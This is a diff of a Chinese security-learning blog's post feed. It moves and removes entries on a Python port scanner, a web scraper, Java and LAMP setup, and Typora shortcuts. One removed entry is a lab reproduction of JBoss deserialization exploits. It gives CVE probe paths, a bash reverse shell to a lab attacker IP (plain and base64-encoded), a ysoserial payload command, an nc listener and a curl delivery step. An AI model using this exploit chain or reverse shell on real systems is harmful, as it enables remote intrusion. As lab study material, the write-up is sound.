-<h1 id="三、代码"><a href="#三、代码" class="headerlink" title="三、代码"></a>三、代码</h1><pre class="highlight"><span class="line">#!/usr/bin/python</span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line">&quot;&quot;&quot;</span><br><span class="line">    描述：借用端口扫描项目，梳理套接字、多线程（守护进程、线程锁）的简单使用</span><br><span class="line">    author：chen</span><br><span class="line">    date:2021-6-27</span><br><span class="line">&quot;&quot;&quot;</span><br><span class="line">import socket</span><br><span class="line">import sys</span><br><span class="line">import queue</span><br><span class="line">import threading</span><br><span class="line"></span><br><span class="line"># 全局变量，队列，用来依次存储端口号</span><br><span class="line">q = queue.Queue()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def portScan():</span><br><span class="line">    while not q.empty():</span><br><span class="line">        port = q.get()</span><br><span class="line">        # 设置套接字连接</span><br><span class="line">        c = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">        # 设置超时重连时间，单位秒，不设置会导致发包速度极慢，默认15秒</span><br><span class="line">        c.settimeout(0.5)</span><br><span class="line">        # connect.ex()会一直尝试连接，连接成功返回0，失败返回错误信息（key值）</span><br><span class="line">        if c.connect_ex((host, port)) == 0:</span><br><span class="line">            print(&quot;%s:%d is open&quot; % (host, port))</span><br><span class="line">            s = host + &quot;:&quot; + str(port)</span><br><span class="line">            # 开启进程锁，多线程写入数据</span><br><span class="line">            lock.acquire()</span><br><span class="line">            with open(&#x27;./ports.txt&#x27;, &#x27;a&#x27;) as fp:</span><br><span class="line">                fp.write(s + &quot;\n&quot;)</span><br><span class="line">                # 释放锁</span><br><span class="line">            lock.release()</span><br><span class="line">        else:</span><br><span class="line">            print(&quot;%s:%d not open&quot; % (host, port))</span><br><span class="line">        # 关闭套接字连接</span><br><span class="line">        c.close()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 独立执行时的程序入口</span><br><span class="line">if __name__ == &quot;__main__&quot;:</span><br><span class="line">    #argv用来接收用户输入，按输入次序分别为argv[0-n],argv[0]表示脚本名</span><br><span class="line">    if len(sys.argv) &lt; 3:</span><br><span class="line">        print(&quot;请以以下格式输入：&quot;)</span><br><span class="line">        print(&quot;python portScan.py ip 线程数&quot;)</span><br><span class="line">    host = sys.argv[1]</span><br><span class="line">    thread_num = int(sys.argv[2])</span><br><span class="line">    # 在进程开始前，定义进程锁，不可在进程中定义锁，否则线程自己使用自己的锁，则失去进程锁的意义</span><br><span class="line">    lock = threading.RLock()</span><br><span class="line"></span><br><span class="line">    for port in range(1, 65536):</span><br><span class="line">        q.put(port)</span><br><span class="line">    for i in range(thread_num):</span><br><span class="line">        # 开启守护进程</span><br><span class="line">        t = threading.Thread(target=portScan, daemon=True)</span><br><span class="line">        t.start()</span><br><span class="line"></span><br><span class="line">    # 设置主进程死循环，方便接收中断信号</span><br><span class="line">    # 因为设置了守护进程，所以主进程结束，子进程也会立刻结束</span><br><span class="line">    while 1:</span><br><span class="line">        pass</span><br></pre>
-
+<p>附件，快捷键对照表</p>
+<p> <img src="/article/image-20210620140349383.png" alt="image-20210620140349383" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="/article/image-20210620140349383.png" class="lozad post-image"></p>
+<p><img src="/article/image-20210620140429130.png" alt="image-20210620140429130" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="/article/image-20210620140429130.png" class="lozad post-image"></p>
 ]]></content>
       <categories>
-        <category>Python</category>
+        <category>附加</category>
       </categories>
       <tags>
-        <tag>socket模块</tag>
-        <tag>threading模块</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>JBoss反序列化漏洞复现</title>
-    <url>/article/b552cccc.html</url>
-    <content><![CDATA[<h1 id="1、确认漏洞及类型"><a href="#1、确认漏洞及类型" class="headerlink" title="1、确认漏洞及类型"></a>1、确认漏洞及类型</h1><p>在jboss的url后缀添加如下信息，根据回显确定漏洞版本</p>
-<p>a、访问/invoker/readonly，返回500则说明存在漏洞-&gt;CVE-2017-12149</p>
-<p>b、访问/jbossmq-httpil/HTTPServerILServlet，返回This is the JBossMQ HTTP-IL则存在漏洞-&gt;CVE-2017-7504</p>
-<p>c、访问/invoker/EJBInvokerServlet,返回下载弹窗则存在漏洞-&gt;CVE-2013-4810</p>
-<p>d、访问/invoker/JMXInvokerServlet,返回下载弹窗则存在漏洞-&gt;CVE-2015-7501</p>
-<h1 id="2、制作payload"><a href="#2、制作payload" class="headerlink" title="2、制作payload"></a>2、制作payload</h1><p>工具：ysoserial.jar</p>
-<p>靶机：192.168.66.140（Ubuntu_vulhub）</p>
-<p>攻击机：192.168.66.138</p>
-<h2 id="1、写反弹shell"><a href="#1、写反弹shell" class="headerlink" title="1、写反弹shell"></a>1、写反弹shell</h2><pre class="highlight"><span class="line">bash -i &gt;&amp; /dev/tcp/192.168.66.138/1111 0&gt;&amp;1</span><br></pre>
-
-<h2 id="2、bash64加密，勾选bash"><a href="#2、bash64加密，勾选bash" class="headerlink" title="2、bash64加密，勾选bash"></a>2、bash64加密，勾选bash</h2><p>（<a href="http://www.jackson-t.ca/runtime-exec-payloads.html%EF%BC%89">http://www.jackson-t.ca/runtime-exec-payloads.html）</a></p>
-<pre class="highlight"><span class="line">bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjY2LjEzOC8xMTExIDA+JjE=&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;</span><br></pre>
-
-<h2 id="3、使用ysoserial-jar制作payload"><a href="#3、使用ysoserial-jar制作payload" class="headerlink" title="3、使用ysoserial.jar制作payload"></a>3、使用ysoserial.jar制作payload</h2><pre class="highlight"><span class="line">java -jar ysoserial.jar CommonsCollections5 &quot;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjY2LjEzOC8xMTExIDA+JjE=&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot; &gt; poc.ser</span><br></pre>
-
-<p>注：<code>CommonsCollections有1-10，5及以后有效</code></p>
-<h2 id="4、攻击机开启端口监听"><a href="#4、攻击机开启端口监听" class="headerlink" title="4、攻击机开启端口监听"></a>4、攻击机开启端口监听</h2><pre class="highlight"><span class="line">nc -lvp 1111</span><br></pre>
-
-<h2 id="5、使用curl命令发送payload"><a href="#5、使用curl命令发送payload" class="headerlink" title="5、使用curl命令发送payload"></a>5、使用curl命令发送payload</h2><pre class="highlight"><span class="line">curl http:192.168.66.140:8080+试探目录 --data-binary @poc.ser</span><br></pre>
-
-<p>注：poc版本&gt;=5</p>
-<h2 id="6、成功反弹shell"><a href="#6、成功反弹shell" class="headerlink" title="6、成功反弹shell"></a>6、成功反弹shell</h2>]]></content>
-      <categories>
-        <category>漏洞复现</category>
-      </categories>
-      <tags>
-        <tag>JBoss反序列化</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Python之网络爬虫</title>
-    <url>/article/f3b65bec.html</url>
-    <content><![CDATA[<h1 id="一、简介"><a href="#一、简介" class="headerlink" title="一、简介"></a>一、简介</h1><p>借用网络爬虫脚本，记录下requests模块和bs4模块的知识点，以供日后查阅。</p>
-<h1 id="二、模块梳理"><a href="#二、模块梳理" class="headerlink" title="二、模块梳理"></a>二、模块梳理</h1><h2 id="requests模块"><a href="#requests模块" class="headerlink" title="requests模块"></a>requests模块</h2><p>介绍：发送简单请求，获取响应</p>
-<p>使用：</p>
-<pre class="highlight"><span class="line">import requests				# 导包</span><br><span class="line">res = requests.get(url)		# 发送get请求包（可换成.post）</span><br><span class="line">res.text					# 获取返回包内容</span><br><span class="line">res.request					# 获取请求包内容</span><br><span class="line">res.encoding  				# 获取页面编码格式</span><br><span class="line">res.content			  		# http响应内容的二进制形式</span><br><span class="line">res.status_code				# http响应码，200响应成功，404失败</span><br></pre>
-
-
-
-<h2 id="BeautifulSoup模块"><a href="#BeautifulSoup模块" class="headerlink" title="BeautifulSoup模块"></a>BeautifulSoup模块</h2><p>介绍：用于解析html/xml。</p>
-<p>使用</p>
-<pre class="highlight"><span class="line">from bs4 import BeautifulSoup				# 导包</span><br><span class="line">soup = BeautifulSoup(&#x27;html&#x27;, &#x27;lxml&#x27;)		# 获取html属性</span><br><span class="line">soup.title									# 获取其中title内容,包括标签</span><br><span class="line">soup.title.string							# 仅获取title</span><br><span class="line">soup.select									# 指定某个元素下某个标签</span><br><span class="line">	soup.select(&#x27;.book-mulu &gt; ul &gt; li &gt; a&#x27;)</span><br><span class="line">	同</span><br><span class="line">	soup.find(&#x27;div&#x27;,class_=&#x27;chapter_content&#x27;)</span><br><span class="line">soup.text									# 获取标签内容</span><br><span class="line">find_all									# 查找所有符合条件的元素</span><br><span class="line">find										# 匹配第一个元素</span><br><span class="line"></span><br></pre>
-
-
-
-<h1 id="三、代码"><a href="#三、代码" class="headerlink" title="三、代码"></a>三、代码</h1><pre class="highlight"><span class="line">#!/usr/bin/python</span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line">&quot;&quot;&quot;</span><br><span class="line">    描述：借用网络爬虫脚本，梳理bs4、requests的简单使用</span><br><span class="line">    author：chen</span><br><span class="line">    date:2021-6-27</span><br><span class="line">&quot;&quot;&quot;</span><br><span class="line"></span><br><span class="line">import requests</span><br><span class="line">from bs4 import BeautifulSoup</span><br><span class="line"></span><br><span class="line"># 自定义请求头</span><br><span class="line">headers = &#123;</span><br><span class="line">    &#x27;User-Agent&#x27;: &#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0&#x27;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def page_link(url):</span><br><span class="line">    con = &#x27;&#x27;</span><br><span class="line">    reponse = requests.get(url=url, headers=headers)</span><br><span class="line">    # 获取当前页面编码格式</span><br><span class="line">    code = reponse.encoding</span><br><span class="line">    # 对响应包的内容解码</span><br><span class="line">    page_text = reponse.text.encode(code).decode(&#x27;gbk&#x27;)</span><br><span class="line">    # 使用bs获取指定标签内容（需绑定解析器lxml）</span><br><span class="line">    soup = BeautifulSoup(page_text, &quot;lxml&quot;).select(&#x27;.onearcxsbd &gt; p&#x27;)</span><br><span class="line">    for i in soup:</span><br><span class="line">        # print(i.text)</span><br><span class="line">        con = con + i.text</span><br><span class="line">    return con</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 程序入口</span><br><span class="line">if __name__ == &quot;__main__&quot;:</span><br><span class="line">    url = &#x27;https://www.xyyuedu.com/gdmz/sidamingzhu/sgyy/&#x27;      # 目标地址</span><br><span class="line">    reponse = requests.get(url=url, headers=headers)            # 获取请求</span><br><span class="line">    # print(reponse.text)</span><br><span class="line">    code = reponse.encoding                                     # 获取编码方式</span><br><span class="line">    # code = reponse.apparent_encoding</span><br><span class="line">    # print(code)</span><br><span class="line">    page_text = reponse.text.encode(code).decode(&#x27;gbk&#x27;)         # 先以网页原编码方式编码，在以指定格式解码，注意，数据仅以编码方式存储，但未进行编码</span><br><span class="line">    # print(page_text)</span><br><span class="line"></span><br><span class="line">    soup = BeautifulSoup(page_text, &quot;lxml&quot;)                     # 创建soup对象并指定解析器</span><br><span class="line">    aAttr = soup.select(&#x27;.zhangjie2 &gt; li &gt; a&#x27;)                  # 获得url所在的标签信息</span><br><span class="line">    # print(aAttr)</span><br><span class="line"></span><br><span class="line">    for i in aAttr:</span><br><span class="line">        # print(i.text)</span><br><span class="line">        title = i.text</span><br><span class="line">        link = &#x27;https://www.xyyuedu.com&#x27; + i[&#x27;href&#x27;]        # 获取章节连接</span><br><span class="line">        content = page_link(link)</span><br><span class="line">        print(&#x27;开始下载 \n&#x27; + title)</span><br><span class="line">        # print(title)</span><br><span class="line">        # print(link)</span><br><span class="line">        # print(content)</span><br><span class="line">        with open(&#x27;./三国演义.txt&#x27;, &#x27;a&#x27;, encoding=&#x27;utf-8&#x27;) as fp:</span><br><span class="line">            fp.write(title + &#x27;\n&#x27; + content + &#x27;\n\n\n&#x27;)</span><br><span class="line">            print(title + &#x27;\n&#x27; + &#x27;下载结束&#x27; + &#x27;\n&#x27;)</span><br></pre>
-
-]]></content>
-      <categories>
-        <category>Python</category>
-      </categories>
-      <tags>
-        <tag>BeautifulSoup模块</tag>
-        <tag>requests模块</tag>
+        <tag>Typora</tag>
       </tags>
   </entry>
   <entry>
@@ -896,99 +949,6 @@
       </tags>
   </entry>
   <entry>
-    <title>Typora常用快捷键</title>
-    <url>/article/12a67745.html</url>
-    <content><![CDATA[<table>
-<thead>
-<tr>
-<th>快捷键</th>
-<th>说明</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>Ctrl+T</td>
-<td>插入表格</td>
-</tr>
-<tr>
-<td>Ctrl+Shift+K</td>
-<td>插入代码块</td>
-</tr>
-<tr>
-<td>Ctrl+0</td>
-<td>段落</td>
-</tr>
-<tr>
-<td>Ctrl+1-6</td>
-<td>1-6级标题</td>
-</tr>
-<tr>
-<td>Ctrl+Enter</td>
-<td>表格下方插入行</td>
-</tr>
-<tr>
-<td>Ctrl+/</td>
-<td>源码编辑</td>
-</tr>
-<tr>
-<td>Ctrl+Shift+V</td>
-<td>粘贴为纯文本</td>
-</tr>
-</tbody></table>
-<p>文件-偏好设置-高级设置-conf.user.json    重新设置快捷键</p>
-<pre class="highlight"><span class="line">&quot;keyBinding&quot;: &#123;</span><br><span class="line">    // for example: </span><br><span class="line">    // &quot;Always on Top&quot;: &quot;Ctrl+Shift+P&quot;</span><br><span class="line">    &quot;Always on Top&quot;: &quot;Ctrl+Shift+P&quot;,  </span><br><span class="line">    &quot;Code Fences&quot;: &quot;Ctrl+Shift+F&quot;,  </span><br><span class="line">    &quot;Ordered List&quot;:&quot;Ctrl+Alt+o&quot;,  </span><br><span class="line">    &quot;Unordered List&quot;: &quot;Ctrl+Alt+u&quot;  </span><br><span class="line">  &#125;,</span><br></pre>
-
-<p>附件，快捷键对照表</p>
-<p> <img src="/article/image-20210620140349383.png" alt="image-20210620140349383" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="/article/image-20210620140349383.png" class="lozad post-image"></p>
-<p><img src="/article/image-20210620140429130.png" alt="image-20210620140429130" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="/article/image-20210620140429130.png" class="lozad post-image"></p>
-]]></content>
-      <categories>
-        <category>附加</category>
-      </categories>
-      <tags>
-        <tag>Typora</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Windows多个Java环境共存</title>
-    <url>/article/5915dfc0.html</url>
-    <content><![CDATA[<h1 id="java8环境配置"><a href="#java8环境配置" class="headerlink" title="java8环境配置"></a>java8环境配置</h1><p>1、控制面板&gt; 系统&gt; 高级系统设置&gt; 环境变量&gt; 系统变量</p>
-<p>2、新建 JAVA_HOME</p>
-<pre class="highlight"><span class="line">C:\Program Files\Java\jdk1.8.0_281		#根据具体路径更改</span><br></pre>
-
-<p>3、新建 CLASSPATH</p>
-<pre class="highlight"><span class="line">.;%JAVA_HOME%\lib\dt.jar;%JAVA_HOME%\lib\tools.jar;</span><br></pre>
-
-<p>4、修改 Path</p>
-<pre class="highlight"><span class="line">%JAVA_HOME%\bin;%JAVA_HOME%\jre\bin;</span><br></pre>
-
-<p>5、重启</p>
-<p>其他：Path中改单行显示为多行显示，需要将其中一个绝对路径变量放在行首，如</p>
-<pre class="highlight"><span class="line">C:\Windows\System32;		#低版本Windows系统不支持</span><br></pre>
-
-
-
-<h1 id="java11环境配置"><a href="#java11环境配置" class="headerlink" title="java11环境配置"></a>java11环境配置</h1><p>1、控制面板&gt; 系统&gt; 高级系统设置&gt; 环境变量&gt; 系统变量</p>
-<p>2、新建 JAVA_HOME</p>
-<pre class="highlight"><span class="line">C:\Program Files\Java\jdk-11.0.10		#根据具体路径更改</span><br></pre>
-
-<p>3、修改 Path</p>
-<pre class="highlight"><span class="line">%JAVA_HOME%\bin;</span><br></pre>
-
-
-
-<h1 id="Java版本切换"><a href="#Java版本切换" class="headerlink" title="Java版本切换"></a>Java版本切换</h1><p>1、新建JAVA_HOME、JAVA_HOME8、JAVA_HOME11</p>
-<p>2、新建java8.bat</p>
-<pre class="highlight"><span class="line">setx JAVA_HOME &quot;%JAVA_HOME8%&quot; /m</span><br></pre>
-
-<p>3、新建java11.bat</p>
-<pre class="highlight"><span class="line">setx JAVA_HOME &quot;%JAVA_HOME11%&quot; /m</span><br></pre>
-
-]]></content>
-      <tags>
-        <tag>Java环境配置</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>Ubuntu搭建Docker + Vulhub</title>
     <url>/article/a438e427.html</url>
     <content><![CDATA[<h1 id="安装docker"><a href="#安装docker" class="headerlink" title="安装docker"></a>安装docker</h1><p>1、在线安装docker</p>
@@ -1106,6 +1066,101 @@
       </tags>
   </entry>
   <entry>
+    <title>Windows随记</title>
+    <url>/article/afc45429.html</url>
+    <content><![CDATA[<table>
+<thead>
+<tr>
+<th>命令</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>netstat -r</td>
+<td>列出当前路由信息</td>
+</tr>
+<tr>
+<td>dir</td>
+<td>显示文件列表，同linux下ls</td>
+</tr>
+<tr>
+<td>mkdir或mk</td>
+<td>创建目录</td>
+</tr>
+<tr>
+<td>rmdir或rd</td>
+<td>删除目录</td>
+</tr>
+<tr>
+<td>copy</td>
+<td>复制，需要指定目录</td>
+</tr>
+<tr>
+<td>del</td>
+<td>删除</td>
+</tr>
+<tr>
+<td>touch</td>
+<td>创建文件</td>
+</tr>
+<tr>
+<td>ren</td>
+<td>重命名</td>
+</tr>
+<tr>
+<td>type</td>
+<td>查看文本文件</td>
+</tr>
+</tbody></table>
+]]></content>
+      <categories>
+        <category>Windows</category>
+      </categories>
+      <tags>
+        <tag>随记</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Windows多个Java环境共存</title>
+    <url>/article/5915dfc0.html</url>
+    <content><![CDATA[<h1 id="java8环境配置"><a href="#java8环境配置" class="headerlink" title="java8环境配置"></a>java8环境配置</h1><p>1、控制面板&gt; 系统&gt; 高级系统设置&gt; 环境变量&gt; 系统变量</p>
+<p>2、新建 JAVA_HOME</p>
+<pre class="highlight"><span class="line">C:\Program Files\Java\jdk1.8.0_281		#根据具体路径更改</span><br></pre>
+
+<p>3、新建 CLASSPATH</p>
+<pre class="highlight"><span class="line">.;%JAVA_HOME%\lib\dt.jar;%JAVA_HOME%\lib\tools.jar;</span><br></pre>
+
+<p>4、修改 Path</p>
+<pre class="highlight"><span class="line">%JAVA_HOME%\bin;%JAVA_HOME%\jre\bin;</span><br></pre>
+
+<p>5、重启</p>
+<p>其他：Path中改单行显示为多行显示，需要将其中一个绝对路径变量放在行首，如</p>
+<pre class="highlight"><span class="line">C:\Windows\System32;		#低版本Windows系统不支持</span><br></pre>
+
+
+
+<h1 id="java11环境配置"><a href="#java11环境配置" class="headerlink" title="java11环境配置"></a>java11环境配置</h1><p>1、控制面板&gt; 系统&gt; 高级系统设置&gt; 环境变量&gt; 系统变量</p>
+<p>2、新建 JAVA_HOME</p>
+<pre class="highlight"><span class="line">C:\Program Files\Java\jdk-11.0.10		#根据具体路径更改</span><br></pre>
+
+<p>3、修改 Path</p>
+<pre class="highlight"><span class="line">%JAVA_HOME%\bin;</span><br></pre>
+
+
+
+<h1 id="Java版本切换"><a href="#Java版本切换" class="headerlink" title="Java版本切换"></a>Java版本切换</h1><p>1、新建JAVA_HOME、JAVA_HOME8、JAVA_HOME11</p>
+<p>2、新建java8.bat</p>
+<pre class="highlight"><span class="line">setx JAVA_HOME &quot;%JAVA_HOME8%&quot; /m</span><br></pre>
+
+<p>3、新建java11.bat</p>
+<pre class="highlight"><span class="line">setx JAVA_HOME &quot;%JAVA_HOME11%&quot; /m</span><br></pre>
+
+]]></content>
+      <tags>
+        <tag>Java环境配置</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>centos7搭建DVWA</title>
     <url>/article/bfa55e85.html</url>
     <content><![CDATA[<h1 id="一、准备"><a href="#一、准备" class="headerlink" title="一、准备"></a>一、准备</h1><p>Apache+Mysql+PHP+DVWA</p>
@@ -1160,61 +1215,6 @@
       </categories>
       <tags>
         <tag>DVWA</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Windows随记</title>
-    <url>/article/afc45429.html</url>
-    <content><![CDATA[<table>
-<thead>
-<tr>
-<th>命令</th>
-<th>说明</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>netstat -r</td>
-<td>列出当前路由信息</td>
-</tr>
-<tr>
-<td>dir</td>
-<td>显示文件列表，同linux下ls</td>
-</tr>
-<tr>
-<td>mkdir或mk</td>
-<td>创建目录</td>
-</tr>
-<tr>
-<td>rmdir或rd</td>
-<td>删除目录</td>
-</tr>
-<tr>
-<td>copy</td>
-<td>复制，需要指定目录</td>
-</tr>
-<tr>
-<td>del</td>
-<td>删除</td>
-</tr>
-<tr>
-<td>touch</td>
-<td>创建文件</td>
-</tr>
-<tr>
-<td>ren</td>
-<td>重命名</td>
-</tr>
-<tr>
-<td>type</td>
-<td>查看文本文件</td>
-</tr>
-</tbody></table>
-]]></content>
-      <categories>
-        <category>Windows</category>
-      </categories>
-      <tags>
-        <tag>随记</tag>
       </tags>
   </entry>
   <entry>
@@ -1277,58 +1277,6 @@
       <tags>
         <tag>添加用户</tag>
         <tag>提权</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>搭建LAMP环境</title>
-    <url>/article/a964a121.html</url>
-    <content><![CDATA[<h1 id="LAMP："><a href="#LAMP：" class="headerlink" title="LAMP："></a>LAMP：</h1><p>Linux+Apache+Mysql+PHP</p>
-<h1 id="1、安装Apache（httpd）"><a href="#1、安装Apache（httpd）" class="headerlink" title="1、安装Apache（httpd）"></a>1、安装Apache（httpd）</h1><pre class="highlight"><span class="line">yum install httpd httpd-devel httpd-manual httpd-tools</span><br></pre>
-
-<h1 id="2、启动apache并设置开机自启"><a href="#2、启动apache并设置开机自启" class="headerlink" title="2、启动apache并设置开机自启"></a>2、启动apache并设置开机自启</h1><pre class="highlight"><span class="line">systemctl start httpd		#开启apache</span><br><span class="line"></span><br><span class="line">systemctl enable httpd		#设置开机自启</span><br><span class="line"></span><br><span class="line">systemctl status httpd		#查看apache状态</span><br></pre>
-
-
-
-<h1 id="3、安装Mysql"><a href="#3、安装Mysql" class="headerlink" title="3、安装Mysql"></a>3、安装Mysql</h1><pre class="highlight"><span class="line">yum install mariadb-server</span><br></pre>
-
-
-
-<h1 id="4、启动Mysql并设置开机自启"><a href="#4、启动Mysql并设置开机自启" class="headerlink" title="4、启动Mysql并设置开机自启"></a>4、启动Mysql并设置开机自启</h1><pre class="highlight"><span class="line">systemctl start mariadb			#开启mariadb</span><br><span class="line"></span><br><span class="line">systemctl enable mariadb		#设置开机自启</span><br><span class="line"></span><br><span class="line">systemctl status mariadb		#查看mariadb状态</span><br></pre>
-
-
-
-<h1 id="5、配置Mysql数据库"><a href="#5、配置Mysql数据库" class="headerlink" title="5、配置Mysql数据库"></a>5、配置Mysql数据库</h1><pre class="highlight"><span class="line">mysql_secure_installation		#初始化mysql数据库（全部回车确认）</span><br></pre>
-
-<p>设置mysql密码（非操作系统密码）</p>
-<h1 id="6、安装PHP"><a href="#6、安装PHP" class="headerlink" title="6、安装PHP"></a>6、安装PHP</h1><p>(php-fpm php-mysqlnd不装，其他均可)</p>
-<pre class="highlight"><span class="line">yum install php php-common php-cli php-devel php-gd php-ldap php-mbstring php-mysql php-pdo php-pear php-xml php-pgsql php-process php-snmp php-soap</span><br></pre>
-
-<h1 id="7、重启apache使php生效"><a href="#7、重启apache使php生效" class="headerlink" title="7、重启apache使php生效"></a>7、重启apache使php生效</h1><p>（php不是独立软件，依附apache）</p>
-<pre class="highlight"><span class="line">systemctl restart httpd</span><br></pre>
-
-<h1 id="8、解压WP网站"><a href="#8、解压WP网站" class="headerlink" title="8、解压WP网站"></a>8、解压WP网站</h1><h1 id="9、复制WP网站文件至Apache网站目录"><a href="#9、复制WP网站文件至Apache网站目录" class="headerlink" title="9、复制WP网站文件至Apache网站目录"></a>9、复制WP网站文件至Apache网站目录</h1><pre class="highlight"><span class="line">cp -r WP/* /var/www/html</span><br></pre>
-
-<h1 id="10、赋予Apache网站apache权限"><a href="#10、赋予Apache网站apache权限" class="headerlink" title="10、赋予Apache网站apache权限"></a>10、赋予Apache网站apache权限</h1><p>（apache服务由apache账户运行，还权限，安全控制）</p>
-<pre class="highlight"><span class="line">chown -R apache:apache /var/www/html</span><br></pre>
-
-<h1 id="11、禁用SELinux"><a href="#11、禁用SELinux" class="headerlink" title="11、禁用SELinux"></a>11、禁用SELinux</h1><p>（安全访问控制，影响网站访问）</p>
-<pre class="highlight"><span class="line">vi /etc/sysconfig/selinux</span><br><span class="line"></span><br><span class="line">修改SELINUX=disabled</span><br><span class="line">重启操作系统（reboot）</span><br></pre>
-
-
-
-<h1 id="12、访问网站ip-80端口，安装wp网站"><a href="#12、访问网站ip-80端口，安装wp网站" class="headerlink" title="12、访问网站ip+80端口，安装wp网站"></a>12、访问网站ip+80端口，安装wp网站</h1><h1 id="13、此时需要设置mysql账户"><a href="#13、此时需要设置mysql账户" class="headerlink" title="13、此时需要设置mysql账户"></a>13、此时需要设置mysql账户</h1><pre class="highlight"><span class="line">mysql -uroot -p			# 启动mysql（需要输入mysql密码）</span><br><span class="line">create database wp_web;	# 创建mysql账户</span><br><span class="line">exit					# 退出mysql</span><br><span class="line"></span><br></pre>
-
-<p>（注意！wp-config.php  删除可重装wp网站）</p>
-<h1 id="14、其他"><a href="#14、其他" class="headerlink" title="14、其他"></a>14、其他</h1><pre class="highlight"><span class="line">/var/www/html					# Apache默认网站路径</span><br><span class="line">/etc/httpd/conf/httpd.conf		# Apache配置文件路径</span><br></pre>
-
-<p>修改DocumentRoot “/var/www”即可修改网站路径</p>
-<p> <img src="/article/2.png" alt="2" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="/article/2.png" class="lozad post-image"></p>
-]]></content>
-      <categories>
-        <category>Linux</category>
-      </categories>
-      <tags>
-        <tag>Apache环境搭建</tag>
       </tags>
   </entry>
   <entry>
@@ -1503,6 +1451,58 @@
       </tags>
   </entry>
   <entry>
+    <title>搭建LAMP环境</title>
+    <url>/article/a964a121.html</url>
+    <content><![CDATA[<h1 id="LAMP："><a href="#LAMP：" class="headerlink" title="LAMP："></a>LAMP：</h1><p>Linux+Apache+Mysql+PHP</p>
+<h1 id="1、安装Apache（httpd）"><a href="#1、安装Apache（httpd）" class="headerlink" title="1、安装Apache（httpd）"></a>1、安装Apache（httpd）</h1><pre class="highlight"><span class="line">yum install httpd httpd-devel httpd-manual httpd-tools</span><br></pre>
+
+<h1 id="2、启动apache并设置开机自启"><a href="#2、启动apache并设置开机自启" class="headerlink" title="2、启动apache并设置开机自启"></a>2、启动apache并设置开机自启</h1><pre class="highlight"><span class="line">systemctl start httpd		#开启apache</span><br><span class="line"></span><br><span class="line">systemctl enable httpd		#设置开机自启</span><br><span class="line"></span><br><span class="line">systemctl status httpd		#查看apache状态</span><br></pre>
+
+
+
+<h1 id="3、安装Mysql"><a href="#3、安装Mysql" class="headerlink" title="3、安装Mysql"></a>3、安装Mysql</h1><pre class="highlight"><span class="line">yum install mariadb-server</span><br></pre>
+
+
+
+<h1 id="4、启动Mysql并设置开机自启"><a href="#4、启动Mysql并设置开机自启" class="headerlink" title="4、启动Mysql并设置开机自启"></a>4、启动Mysql并设置开机自启</h1><pre class="highlight"><span class="line">systemctl start mariadb			#开启mariadb</span><br><span class="line"></span><br><span class="line">systemctl enable mariadb		#设置开机自启</span><br><span class="line"></span><br><span class="line">systemctl status mariadb		#查看mariadb状态</span><br></pre>
+
+
+
+<h1 id="5、配置Mysql数据库"><a href="#5、配置Mysql数据库" class="headerlink" title="5、配置Mysql数据库"></a>5、配置Mysql数据库</h1><pre class="highlight"><span class="line">mysql_secure_installation		#初始化mysql数据库（全部回车确认）</span><br></pre>
+
+<p>设置mysql密码（非操作系统密码）</p>
+<h1 id="6、安装PHP"><a href="#6、安装PHP" class="headerlink" title="6、安装PHP"></a>6、安装PHP</h1><p>(php-fpm php-mysqlnd不装，其他均可)</p>
+<pre class="highlight"><span class="line">yum install php php-common php-cli php-devel php-gd php-ldap php-mbstring php-mysql php-pdo php-pear php-xml php-pgsql php-process php-snmp php-soap</span><br></pre>
+
+<h1 id="7、重启apache使php生效"><a href="#7、重启apache使php生效" class="headerlink" title="7、重启apache使php生效"></a>7、重启apache使php生效</h1><p>（php不是独立软件，依附apache）</p>
+<pre class="highlight"><span class="line">systemctl restart httpd</span><br></pre>
+
+<h1 id="8、解压WP网站"><a href="#8、解压WP网站" class="headerlink" title="8、解压WP网站"></a>8、解压WP网站</h1><h1 id="9、复制WP网站文件至Apache网站目录"><a href="#9、复制WP网站文件至Apache网站目录" class="headerlink" title="9、复制WP网站文件至Apache网站目录"></a>9、复制WP网站文件至Apache网站目录</h1><pre class="highlight"><span class="line">cp -r WP/* /var/www/html</span><br></pre>
+
+<h1 id="10、赋予Apache网站apache权限"><a href="#10、赋予Apache网站apache权限" class="headerlink" title="10、赋予Apache网站apache权限"></a>10、赋予Apache网站apache权限</h1><p>（apache服务由apache账户运行，还权限，安全控制）</p>
+<pre class="highlight"><span class="line">chown -R apache:apache /var/www/html</span><br></pre>
+
